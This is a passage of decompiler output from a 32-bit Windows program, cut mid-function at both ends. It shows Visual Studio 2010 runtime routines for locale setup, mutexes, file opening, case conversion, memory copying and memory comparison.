  if (*(void **)(this + 0x18) != (void *)0x0) {
    _free(*(void **)(this + 0x18));
  }
  *(undefined4 *)(this + 0x18) = 0;
  *(undefined ***)this = facet::vftable;
  return;
}



// Library Function - Single Match
//  protected: virtual void * __thiscall std::locale::_Locimp::`scalar deleting destructor'(unsigned
// int)
// 
// Library: Visual Studio 2010 Release

void * __thiscall
std::locale::_Locimp::_scalar_deleting_destructor_(_Locimp *this,unsigned_int param_1)

{
  __Locimp(this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  private: static class std::locale::_Locimp * __cdecl std::locale::_Init(void)
// 
// Library: Visual Studio 2010 Release

_Locimp * __cdecl std::locale::_Init(void)

{
  _Locimp *p_Var1;
  _Locimp *p_Var2;
  int local_14 [3];
  undefined4 local_8;
  undefined4 uStack4;
  
  uStack4 = 4;
  local_8 = 0x3ae890;
  p_Var2 = (_Locimp *)0x0;
  p_Var1 = DAT_003d7afc;
  if (DAT_003d7afc == (_Locimp *)0x0) {
    _Lockit::_Lockit((_Lockit *)local_14,0);
    local_8 = 0;
    p_Var1 = DAT_003d7afc;
    if (DAT_003d7afc == (_Locimp *)0x0) {
      p_Var1 = (_Locimp *)FUN_003b103e(0x20);
      if (p_Var1 != (_Locimp *)0x0) {
        p_Var2 = (_Locimp *)_Locimp::_Locimp(p_Var1,false);
      }
      _Setgloballocale(p_Var2);
      *(undefined4 *)(p_Var2 + 0x10) = 0x3f;
      _Yarn<char>::operator_((_Yarn_char_ *)(p_Var2 + 0x18),"C");
      DAT_003d7b00 = p_Var2;
      FUN_00399400((int)p_Var2);
      _DAT_003d7b18 = DAT_003d7b00;
      p_Var1 = p_Var2;
    }
    local_8 = 0xffffffff;
    FUN_003ae995(local_14);
  }
  return p_Var1;
}



undefined4 __fastcall FUN_003ae913(undefined4 param_1)

{
  LONG LVar1;
  _Rmtx *p_Var2;
  
  LVar1 = InterlockedIncrement((LONG *)&lpAddend_003d614c);
  if (LVar1 == 0) {
    p_Var2 = (_Rmtx *)&DAT_003d7b28;
    do {
      __Mtxinit(p_Var2);
      p_Var2 = p_Var2 + 1;
    } while ((int)p_Var2 < 0x3d7b88);
  }
  return param_1;
}



// Library Function - Single Match
//  public: __thiscall std::_Lockit::_Lockit(int)
// 
// Library: Visual Studio 2010 Release

_Lockit * __thiscall std::_Lockit::_Lockit(_Lockit *this,int param_1)

{
  *(int *)this = param_1;
  if (param_1 < 4) {
    __Mtxlock((_Rmtx *)(&DAT_003d7b28 + param_1 * 0x18));
  }
  return this;
}



void __fastcall FUN_003ae995(int *param_1)

{
  if (*param_1 < 4) {
    FUN_003aede8((LPCRITICAL_SECTION)(&DAT_003d7b28 + *param_1 * 0x18));
  }
  return;
}



// Library Function - Single Match
//  public: __thiscall std::_Mutex::_Mutex(void)
// 
// Library: Visual Studio

_Mutex * __thiscall std::_Mutex::_Mutex(_Mutex *this)

{
  _Rmtx *p_Var1;
  
  p_Var1 = (_Rmtx *)FUN_003b103e(0x18);
  *(_Rmtx **)this = p_Var1;
  __Mtxinit(p_Var1);
  return this;
}



void __fastcall FUN_003ae9c6(LPCRITICAL_SECTION *param_1)

{
  FUN_003aedc8(*param_1);
  FUN_003aee4b(*param_1);
  return;
}



// Library Function - Single Match
//  struct _iobuf * __cdecl std::_Xfsopen(char const *,int,int)
// 
// Library: Visual Studio 2010 Release

_iobuf * __cdecl std::_Xfsopen(char *param_1,int param_2,int param_3)

{
  FILE *pFVar1;
  
  pFVar1 = __fsopen(param_1,(&PTR_DAT_003c6330)[param_2],param_3);
  return (_iobuf *)pFVar1;
}



// Library Function - Multiple Matches With Same Base Name
//  struct _iobuf * __cdecl std::_Xfiopen<char>(char const *,int,int)
//  struct _iobuf * __cdecl std::_Xfiopen<wchar_t>(wchar_t const *,int,int)
// 
// Library: Visual Studio 2010 Release

_iobuf * __cdecl _Xfiopen__(char *param_1,uint param_2,int param_3)

{
  uint uVar1;
  _iobuf *_File;
  uint uVar2;
  uint uVar3;
  int iVar4;
  
  uVar3 = param_2 & 4;
  uVar2 = param_2 & 0x80;
  uVar1 = 1;
  if ((param_2 & 0x40) != 0) {
    param_2 = param_2 | 1;
  }
  if ((param_2 & 8) != 0) {
    param_2 = param_2 | 2;
  }
  iVar4 = 0;
  do {
    if (uVar1 == (param_2 & 0xffffff3b)) break;
    uVar1 = (&DAT_003c6398)[iVar4];
    iVar4 = iVar4 + 1;
  } while (uVar1 != 0);
  if ((&DAT_003c6394)[iVar4] != 0) {
    if (((uVar2 == 0) || ((param_2 & 10) == 0)) ||
       (_File = std::_Xfsopen(param_1,0,param_3), _File == (_iobuf *)0x0)) {
      _File = std::_Xfsopen(param_1,iVar4,param_3);
      if (_File == (_iobuf *)0x0) {
        return (_iobuf *)0x0;
      }
      if (uVar3 == 0) {
        return _File;
      }
      iVar4 = _fseek((FILE *)_File,0,2);
      if (iVar4 == 0) {
        return _File;
      }
    }
    _fclose((FILE *)_File);
  }
  return (_iobuf *)0x0;
}



void __cdecl FUN_003aeab6(char *param_1,uint param_2,int param_3)

{
  _Xfiopen__(param_1,param_2,param_3);
  return;
}



// Library Function - Single Match
//  __Tolower
// 
// Library: Visual Studio 2010 Release

int __cdecl __Tolower(int param_1,_Ctypevec *param_2)

{
  _Ctypevec *p_Var1;
  uint *puVar2;
  short *_Code_page;
  int iVar3;
  ushort *puVar4;
  uint uVar5;
  LPCWSTR local_10;
  byte local_8;
  undefined local_7;
  
  p_Var1 = param_2;
  if (param_2 == (_Ctypevec *)0x0) {
    puVar2 = ____lc_handle_func();
    local_10 = (LPCWSTR)puVar2[2];
    _Code_page = (short *)____lc_codepage_func();
  }
  else {
    local_10 = (LPCWSTR)param_2->_Page;
    _Code_page = param_2->_Table;
  }
  if (local_10 == (LPCWSTR)0x0) {
    if (0x19 < param_1 - 0x41U) {
      return param_1;
    }
    return param_1 + 0x20;
  }
  if ((uint)param_1 < 0x100) {
    if (p_Var1 != (_Ctypevec *)0x0) {
      if ((*(byte *)(p_Var1->_Delfl + param_1 * 2) & 1) == 0) {
        return param_1;
      }
      goto LAB_003aeb36;
    }
    iVar3 = _isupper(param_1);
    if (iVar3 == 0) {
      return param_1;
    }
  }
  else {
LAB_003aeb36:
    if (p_Var1 != (_Ctypevec *)0x0) {
      uVar5 = (uint)(int)*(short *)(p_Var1->_Delfl + (param_1 >> 8 & 0xffU) * 2) >> 0xf & 1;
      goto LAB_003aeb71;
    }
  }
  puVar4 = ___pctype_func();
  uVar5 = puVar4[param_1 >> 8 & 0xff] & 0x8000;
LAB_003aeb71:
  if (uVar5 == 0) {
    param_2 = (_Ctypevec *)((uint)param_2 & 0xffff0000 | param_1 & 0xffU);
    iVar3 = 1;
  }
  else {
    param_2 = (_Ctypevec *)
              ((uint)param_2 & 0xff000000 | (uint)CONCAT11((char)param_1,(char)((uint)param_1 >> 8))
              );
    iVar3 = 2;
  }
  iVar3 = ___crtLCMapStringA((_locale_t)0x0,local_10,0x100,(LPCSTR)&param_2,iVar3,(LPSTR)&local_8,3,
                             (int)_Code_page,1);
  if ((iVar3 != 0) && (param_1 = ZEXT14(local_8), iVar3 != 1)) {
    param_1 = ZEXT24(CONCAT11(local_8,local_7));
  }
  return param_1;
}



// Library Function - Single Match
//  __Getctype
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_Ctypevec * __cdecl __Getctype(_Ctypevec *__return_storage_ptr__)

{
  uint *puVar1;
  short *psVar2;
  void *pvVar3;
  undefined4 *puVar4;
  ushort *puVar5;
  uint uVar6;
  
  puVar1 = ____lc_handle_func();
  __return_storage_ptr__->_Page = puVar1[1];
  psVar2 = (short *)____lc_codepage_func();
  __return_storage_ptr__->_Table = psVar2;
  pvVar3 = __calloc_crt(0x100,2);
  __return_storage_ptr__->_Delfl = (int)pvVar3;
  if (pvVar3 == (void *)0x0) {
    puVar5 = ___pctype_func();
    __return_storage_ptr__->_LocaleName = (wchar_t *)0x0;
    __return_storage_ptr__->_Delfl = (int)puVar5;
  }
  else {
    uVar6 = 0x200;
    puVar4 = (undefined4 *)___pctype_func();
    FUN_003aee70((undefined4 *)__return_storage_ptr__->_Delfl,puVar4,uVar6);
    __return_storage_ptr__->_LocaleName = (wchar_t *)0x1;
  }
  return __return_storage_ptr__;
}



// Library Function - Single Match
//  __Toupper
// 
// Library: Visual Studio 2010 Release

int __cdecl __Toupper(int param_1,_Ctypevec *param_2)

{
  _Ctypevec *p_Var1;
  uint *puVar2;
  short *_Code_page;
  int iVar3;
  ushort *puVar4;
  uint uVar5;
  LPCWSTR local_10;
  byte local_8;
  undefined local_7;
  
  p_Var1 = param_2;
  if (param_2 == (_Ctypevec *)0x0) {
    puVar2 = ____lc_handle_func();
    local_10 = (LPCWSTR)puVar2[2];
    _Code_page = (short *)____lc_codepage_func();
  }
  else {
    local_10 = (LPCWSTR)param_2->_Page;
    _Code_page = param_2->_Table;
  }
  if (local_10 == (LPCWSTR)0x0) {
    if (0x19 < param_1 - 0x61U) {
      return param_1;
    }
    return param_1 - 0x20;
  }
  if ((uint)param_1 < 0x100) {
    if (p_Var1 != (_Ctypevec *)0x0) {
      if ((*(byte *)(p_Var1->_Delfl + param_1 * 2) & 2) == 0) {
        return param_1;
      }
      goto LAB_003aeca5;
    }
    iVar3 = _islower(param_1);
    if (iVar3 == 0) {
      return param_1;
    }
  }
  else {
LAB_003aeca5:
    if (p_Var1 != (_Ctypevec *)0x0) {
      uVar5 = (uint)(int)*(short *)(p_Var1->_Delfl + (param_1 >> 8 & 0xffU) * 2) >> 0xf & 1;
      goto LAB_003aece0;
    }
  }
  puVar4 = ___pctype_func();
  uVar5 = puVar4[param_1 >> 8 & 0xff] & 0x8000;
LAB_003aece0:
  if (uVar5 == 0) {
    param_2 = (_Ctypevec *)((uint)param_2 & 0xffff0000 | param_1 & 0xffU);
    iVar3 = 1;
  }
  else {
    param_2 = (_Ctypevec *)
              ((uint)param_2 & 0xff000000 | (uint)CONCAT11((char)param_1,(char)((uint)param_1 >> 8))
              );
    iVar3 = 2;
  }
  iVar3 = ___crtLCMapStringA((_locale_t)0x0,local_10,0x200,(LPCSTR)&param_2,iVar3,(LPSTR)&local_8,3,
                             (int)_Code_page,1);
  if ((iVar3 != 0) && (param_1 = ZEXT14(local_8), iVar3 != 1)) {
    param_1 = ZEXT24(CONCAT11(local_8,local_7));
  }
  return param_1;
}



// Library Function - Single Match
//  __Getcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_Cvtvec * __cdecl __Getcvt(_Cvtvec *__return_storage_ptr__)

{
  _Cvtvec *p_Var1;
  uint *puVar2;
  
  puVar2 = ____lc_handle_func();
  p_Var1 = (_Cvtvec *)puVar2[2];
  ____lc_codepage_func();
  return p_Var1;
}



uint _SRP_Verify_A_mod_N(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  return (uint)p_Var1 & 0xffffff00 | (uint)(p_Var1->_ProcessingThrow != 0);
}



// Library Function - Single Match
//  void __cdecl _Atexit(void (__cdecl*)(void))
// 
// Library: Visual Studio 2010 Release

void __cdecl _Atexit(FuncDef1 *param_1)

{
  PVOID pvVar1;
  
  if (DAT_003d6150 == 0) {
    _abort();
    return;
  }
  DAT_003d6150 = DAT_003d6150 + -1;
  pvVar1 = EncodePointer(param_1);
  *(PVOID *)(DAT_003d6150 * 4 + 0x3d7bac) = pvVar1;
  return;
}



// Library Function - Single Match
//  __Mtxinit
// 
// Library: Visual Studio

void __cdecl __Mtxinit(_Rmtx *param_1)

{
  InitializeCriticalSection((LPCRITICAL_SECTION)param_1);
  return;
}



void __cdecl FUN_003aedc8(LPCRITICAL_SECTION param_1)

{
  DeleteCriticalSection(param_1);
  return;
}



// Library Function - Single Match
//  __Mtxlock
// 
// Library: Visual Studio 2010 Release

void __cdecl __Mtxlock(_Rmtx *param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)param_1);
  return;
}



void __cdecl FUN_003aede8(LPCRITICAL_SECTION param_1)

{
  LeaveCriticalSection(param_1);
  return;
}



void FUN_003aee4b(void *param_1)

{
  _free(param_1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall terminate_if_debugger_present(int param_1,undefined4 param_2,undefined param_3)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  int local_32c;
  undefined4 local_328;
  
  if (param_1 == DAT_003d6664) {
    return;
  }
  _DAT_003d7e18 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)((undefined *)register0x00000010 == (undefined *)0x32c) * 0x40 |
       (uint)(in_AF & 1) * 0x10 | (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_003d7e1c = &param_3;
  _DAT_003d7d58 = 0x10001;
  _DAT_003d7d00 = 0xc0000409;
  _DAT_003d7d04 = 1;
  local_32c = DAT_003d6664;
  local_328 = DAT_003d6668;
  _DAT_003d7d0c = unaff_retaddr;
  _DAT_003d7de4 = in_GS;
  _DAT_003d7de8 = in_FS;
  _DAT_003d7dec = in_ES;
  _DAT_003d7df0 = in_DS;
  _DAT_003d7df4 = unaff_EDI;
  _DAT_003d7df8 = unaff_ESI;
  _DAT_003d7dfc = unaff_EBX;
  _DAT_003d7e00 = param_2;
  _DAT_003d7e04 = param_1;
  _DAT_003d7e08 = in_EAX;
  _DAT_003d7e0c = unaff_EBP;
  DAT_003d7e10 = unaff_retaddr;
  _DAT_003d7e14 = in_CS;
  _DAT_003d7e20 = in_SS;
  _DAT_003d7d50 = IsDebuggerPresent();
  FUN_003bd055();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&ExceptionInfo_003c72b8);
  if (_DAT_003d7d50 == 0) {
    FUN_003bd055();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_003aee70(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  uint uVar17;
  undefined4 *puVar18;
  undefined4 *puVar19;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar19 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar18 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar18 & 3) == 0) {
      uVar17 = param_3 >> 2;
      if (uVar17 < 8) goto LAB_003af058;
      for (; uVar17 != 0; uVar17 = uVar17 - 1) {
        *puVar18 = *puVar19;
        puVar19 = puVar19 + -1;
        puVar18 = puVar18 + -1;
      }
      switch(param_3 & 3) {
      case 1:
        goto switchD_003af07c_caseD_1;
      case 2:
        goto switchD_003af07c_caseD_2;
      case 3:
        goto switchD_003af07c_caseD_3;
      }
    }
    else {
      switch(param_3) {
      case 0:
        break;
      case 1:
switchD_003af07c_caseD_1:
        *(undefined *)((int)puVar18 + 3) = *(undefined *)((int)puVar19 + 3);
        return param_1;
      case 2:
switchD_003af07c_caseD_2:
        *(undefined *)((int)puVar18 + 3) = *(undefined *)((int)puVar19 + 3);
        *(undefined *)((int)puVar18 + 2) = *(undefined *)((int)puVar19 + 2);
        return param_1;
      case 3:
switchD_003af07c_caseD_3:
        *(undefined *)((int)puVar18 + 3) = *(undefined *)((int)puVar19 + 3);
        *(undefined *)((int)puVar18 + 2) = *(undefined *)((int)puVar19 + 2);
        *(undefined *)((int)puVar18 + 1) = *(undefined *)((int)puVar19 + 1);
        return param_1;
      default:
        uVar16 = param_3 - ((uint)puVar18 & 3);
        switch((uint)puVar18 & 3) {
        case 1:
          *(undefined *)((int)puVar18 + 3) = *(undefined *)((int)puVar19 + 3);
          puVar19 = (undefined4 *)((int)puVar19 + -1);
          uVar17 = uVar16 >> 2;
          puVar18 = (undefined4 *)((int)puVar18 - 1);
          if (uVar17 < 8) {
LAB_003af058:
                    // WARNING: Could not recover jumptable at 0x003af05a. Too many branches
                    // WARNING: Treating indirect jump as call
            puVar19 = (undefined4 *)(*(code *)(&PTR_LAB_003af12c)[-uVar17])();
            return puVar19;
          }
          for (; uVar17 != 0; uVar17 = uVar17 - 1) {
            *puVar18 = *puVar19;
            puVar19 = puVar19 + -1;
            puVar18 = puVar18 + -1;
          }
          switch(uVar16 & 3) {
          case 1:
            goto switchD_003af07c_caseD_1;
          case 2:
            goto switchD_003af07c_caseD_2;
          case 3:
            goto switchD_003af07c_caseD_3;
          }
          break;
        case 2:
          *(undefined *)((int)puVar18 + 3) = *(undefined *)((int)puVar19 + 3);
          uVar17 = uVar16 >> 2;
          *(undefined *)((int)puVar18 + 2) = *(undefined *)((int)puVar19 + 2);
          puVar19 = (undefined4 *)((int)puVar19 + -2);
          puVar18 = (undefined4 *)((int)puVar18 - 2);
          if (uVar17 < 8) goto LAB_003af058;
          for (; uVar17 != 0; uVar17 = uVar17 - 1) {
            *puVar18 = *puVar19;
            puVar19 = puVar19 + -1;
            puVar18 = puVar18 + -1;
          }
          switch(uVar16 & 3) {
          case 1:
            goto switchD_003af07c_caseD_1;
          case 2:
            goto switchD_003af07c_caseD_2;
          case 3:
            goto switchD_003af07c_caseD_3;
          }
          break;
        case 3:
          *(undefined *)((int)puVar18 + 3) = *(undefined *)((int)puVar19 + 3);
          *(undefined *)((int)puVar18 + 2) = *(undefined *)((int)puVar19 + 2);
          uVar17 = uVar16 >> 2;
          *(undefined *)((int)puVar18 + 1) = *(undefined *)((int)puVar19 + 1);
          puVar19 = (undefined4 *)((int)puVar19 + -3);
          puVar18 = (undefined4 *)((int)puVar18 - 3);
          if (uVar17 < 8) goto LAB_003af058;
          for (; uVar17 != 0; uVar17 = uVar17 - 1) {
            *puVar18 = *puVar19;
            puVar19 = puVar19 + -1;
            puVar18 = puVar18 + -1;
          }
          switch(uVar16 & 3) {
          case 1:
            goto switchD_003af07c_caseD_1;
          case 2:
            goto switchD_003af07c_caseD_2;
          case 3:
            goto switchD_003af07c_caseD_3;
          }
        }
      }
    }
    return param_1;
  }
  if (((0x7f < param_3) && (_DAT_003ea174 != 0)) && (((uint)param_1 & 0xf) == ((uint)param_2 & 0xf))
     ) {
    puVar19 = param_1;
    if (((uint)param_2 & 0xf) != 0) {
      uVar17 = 0x10 - ((uint)param_2 & 0xf);
      param_3 = param_3 - uVar17;
      for (uVar16 = uVar17 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {
        *(undefined *)puVar19 = *(undefined *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        puVar19 = (undefined4 *)((int)puVar19 + 1);
      }
      for (uVar17 = uVar17 >> 2; uVar17 != 0; uVar17 = uVar17 - 1) {
        *puVar19 = *param_2;
        param_2 = param_2 + 1;
        puVar19 = puVar19 + 1;
      }
    }
    for (uVar16 = param_3 >> 7; uVar16 != 0; uVar16 = uVar16 - 1) {
      uVar1 = param_2[1];
      uVar2 = param_2[2];
      uVar3 = param_2[3];
      uVar4 = param_2[4];
      uVar5 = param_2[5];
      uVar6 = param_2[6];
      uVar7 = param_2[7];
      uVar8 = param_2[8];
      uVar9 = param_2[9];
      uVar10 = param_2[10];
      uVar11 = param_2[0xb];
      uVar12 = param_2[0xc];
      uVar13 = param_2[0xd];
      uVar14 = param_2[0xe];
      uVar15 = param_2[0xf];
      *puVar19 = *param_2;
      puVar19[1] = uVar1;
      puVar19[2] = uVar2;
      puVar19[3] = uVar3;
      puVar19[4] = uVar4;
      puVar19[5] = uVar5;
      puVar19[6] = uVar6;
      puVar19[7] = uVar7;
      puVar19[8] = uVar8;
      puVar19[9] = uVar9;
      puVar19[10] = uVar10;
      puVar19[0xb] = uVar11;
      puVar19[0xc] = uVar12;
      puVar19[0xd] = uVar13;
      puVar19[0xe] = uVar14;
      puVar19[0xf] = uVar15;
      uVar1 = param_2[0x11];
      uVar2 = param_2[0x12];
      uVar3 = param_2[0x13];
      uVar4 = param_2[0x14];
      uVar5 = param_2[0x15];
      uVar6 = param_2[0x16];
      uVar7 = param_2[0x17];
      uVar8 = param_2[0x18];
      uVar9 = param_2[0x19];
      uVar10 = param_2[0x1a];
      uVar11 = param_2[0x1b];
      uVar12 = param_2[0x1c];
      uVar13 = param_2[0x1d];
      uVar14 = param_2[0x1e];
      uVar15 = param_2[0x1f];
      puVar19[0x10] = param_2[0x10];
      puVar19[0x11] = uVar1;
      puVar19[0x12] = uVar2;
      puVar19[0x13] = uVar3;
      puVar19[0x14] = uVar4;
      puVar19[0x15] = uVar5;
      puVar19[0x16] = uVar6;
      puVar19[0x17] = uVar7;
      puVar19[0x18] = uVar8;
      puVar19[0x19] = uVar9;
      puVar19[0x1a] = uVar10;
      puVar19[0x1b] = uVar11;
      puVar19[0x1c] = uVar12;
      puVar19[0x1d] = uVar13;
      puVar19[0x1e] = uVar14;
      puVar19[0x1f] = uVar15;
      param_2 = param_2 + 0x20;
      puVar19 = puVar19 + 0x20;
    }
    if ((param_3 & 0x7f) != 0) {
      for (uVar16 = (param_3 & 0x7f) >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {
        uVar1 = param_2[1];
        uVar2 = param_2[2];
        uVar3 = param_2[3];
        *puVar19 = *param_2;
        puVar19[1] = uVar1;
        puVar19[2] = uVar2;
        puVar19[3] = uVar3;
        param_2 = param_2 + 4;
        puVar19 = puVar19 + 4;
      }
      if ((param_3 & 0xf) != 0) {
        for (uVar16 = (param_3 & 0xf) >> 2; uVar16 != 0; uVar16 = uVar16 - 1) {
          *puVar19 = *param_2;
          param_2 = param_2 + 1;
          puVar19 = puVar19 + 1;
        }
        for (uVar16 = param_3 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {
          *(undefined *)puVar19 = *(undefined *)param_2;
          param_2 = (undefined4 *)((int)param_2 + 1);
          puVar19 = (undefined4 *)((int)puVar19 + 1);
        }
      }
    }
    return param_1;
  }
  puVar19 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar17 = param_3 >> 2;
    if (uVar17 < 8) goto LAB_003aeef0;
    for (; uVar17 != 0; uVar17 = uVar17 - 1) {
      *puVar19 = *param_2;
      param_2 = param_2 + 1;
      puVar19 = puVar19 + 1;
    }
    switch(param_3 & 3) {
    case 1:
      goto switchD_003aeee8_caseD_1;
    case 2:
      goto switchD_003aeee8_caseD_2;
    case 3:
      goto switchD_003aeee8_caseD_3;
    }
  }
  else {
    switch(param_3) {
    case 0:
      break;
    case 1:
switchD_003aeee8_caseD_1:
      *(undefined *)puVar19 = *(undefined *)param_2;
      return param_1;
    case 2:
switchD_003aeee8_caseD_2:
      *(undefined *)puVar19 = *(undefined *)param_2;
      *(undefined *)((int)puVar19 + 1) = *(undefined *)((int)param_2 + 1);
      return param_1;
    case 3:
switchD_003aeee8_caseD_3:
      *(undefined *)puVar19 = *(undefined *)param_2;
      *(undefined *)((int)puVar19 + 1) = *(undefined *)((int)param_2 + 1);
      *(undefined *)((int)puVar19 + 2) = *(undefined *)((int)param_2 + 2);
      return param_1;
    default:
      uVar16 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar17 = uVar16 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar19 = (undefined4 *)((int)param_1 + 3);
        if (uVar17 < 8) {
LAB_003aeef0:
                    // WARNING: Could not recover jumptable at 0x003aeef0. Too many branches
                    // WARNING: Treating indirect jump as call
          puVar19 = (undefined4 *)(*(code *)(&PTR_LAB_003aef74)[uVar17])();
          return puVar19;
        }
        for (; uVar17 != 0; uVar17 = uVar17 - 1) {
          *puVar19 = *param_2;
          param_2 = param_2 + 1;
          puVar19 = puVar19 + 1;
        }
        switch(uVar16 & 3) {
        case 1:
          goto switchD_003aeee8_caseD_1;
        case 2:
          goto switchD_003aeee8_caseD_2;
        case 3:
          goto switchD_003aeee8_caseD_3;
        }
        break;
      case 2:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar17 = uVar16 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar19 = (undefined4 *)((int)param_1 + 2);
        if (uVar17 < 8) goto LAB_003aeef0;
        for (; uVar17 != 0; uVar17 = uVar17 - 1) {
          *puVar19 = *param_2;
          param_2 = param_2 + 1;
          puVar19 = puVar19 + 1;
        }
        switch(uVar16 & 3) {
        case 1:
          goto switchD_003aeee8_caseD_1;
        case 2:
          goto switchD_003aeee8_caseD_2;
        case 3:
          goto switchD_003aeee8_caseD_3;
        }
        break;
      case 3:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar17 = uVar16 >> 2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        puVar19 = (undefined4 *)((int)param_1 + 1);
        if (uVar17 < 8) goto LAB_003aeef0;
        for (; uVar17 != 0; uVar17 = uVar17 - 1) {
          *puVar19 = *param_2;
          param_2 = param_2 + 1;
          puVar19 = puVar19 + 1;
        }
        switch(uVar16 & 3) {
        case 1:
          goto switchD_003aeee8_caseD_1;
        case 2:
          goto switchD_003aeee8_caseD_2;
        case 3:
          goto switchD_003aeee8_caseD_3;
        }
      }
    }
  }
  return param_1;
}



// Library Function - Single Match
//  _memcmp
// 
// Library: Visual Studio 2010 Release

int __cdecl _memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  byte *pbVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  
  if (_Size == 0) {
    return 0;
  }
  if (_Size == 1) {
                    // WARNING: Load size is inaccurate
    uVar4 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar5 = (uint)*_Buf2;
LAB_003b0604:
    if (uVar4 == uVar5) {
      return 0;
    }
    return (uint)(0 < (int)(uVar4 - uVar5)) * 2 + -1;
  }
  if (_Size == 2) {
                    // WARNING: Load size is inaccurate
    uVar4 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar5 = (uint)*_Buf2;
    if ((uVar4 != uVar5) &&
       (iVar3 = (uint)(uVar4 != uVar5 && -1 < (int)(uVar4 - uVar5)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar4 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar5 = (uint)*(byte *)((int)_Buf2 + 1);
    goto LAB_003b0604;
  }
  if (_Size == 3) {
                    // WARNING: Load size is inaccurate
    uVar4 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar5 = (uint)*_Buf2;
    if ((uVar4 != uVar5) &&
       (iVar3 = (uint)(uVar4 != uVar5 && -1 < (int)(uVar4 - uVar5)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar4 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar5 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar4 != uVar5) &&
       (iVar3 = (uint)(uVar4 != uVar5 && -1 < (int)(uVar4 - uVar5)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar4 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar5 = (uint)*(byte *)((int)_Buf2 + 2);
    goto LAB_003b0604;
  }
  if (_Size == 4) {
                    // WARNING: Load size is inaccurate
    uVar4 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar5 = (uint)*_Buf2;
    if ((uVar4 != uVar5) &&
       (iVar3 = (uint)(uVar4 != uVar5 && -1 < (int)(uVar4 - uVar5)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar4 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar5 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar4 != uVar5) &&
       (iVar3 = (uint)(uVar4 != uVar5 && -1 < (int)(uVar4 - uVar5)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar4 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar5 = (uint)*(byte *)((int)_Buf2 + 2);
    if ((uVar4 != uVar5) &&
